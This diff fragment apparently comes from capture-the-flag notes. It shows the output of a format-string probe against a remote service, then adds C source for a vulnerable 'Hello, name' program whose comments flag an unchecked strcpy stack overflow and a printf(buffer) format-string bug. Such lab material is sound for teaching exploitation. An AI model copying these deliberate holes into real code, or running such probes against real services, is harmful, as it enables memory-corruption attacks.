@@ -343,3 +343,49 @@ Hello, AAAA.0x41414141.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x
 [+] Receiving all data: Done (20B)
 [*] Closed connection to 10.0.118.104 port 3377
 19 b'\nHello, %cAAAA$\xa0\x04\x08!\n'
+
+
+void say_hello(char *name)
+{
+    char buffer[128];
+
+    strcpy(buffer, name);     // overflow
+    printf("Hello, ");
+    printf(buffer);           // format string
+    puts("!");
+}
+
+int main()
+{
+    setbuf(stdout, NULL);
+    setbuf(stdin, NULL);
+    setbuf(stderr, NULL);
+
+    int len = 0;
+    char *name = malloc(0);
+    char c;
+
+    puts("What's your name?");
+
+    while (1)
+    {
+        scanf("%c", &c);
+
+        len++;
+        name = realloc(name, len);
+
+        if (c == '\n')
+        {
+            name[len-1] = '\0';
+            break;
+        }
+
+        name[len-1] = c;
+    }
+
+    say_hello(name);
+
+    free(name);
+
+    return 0;
+}
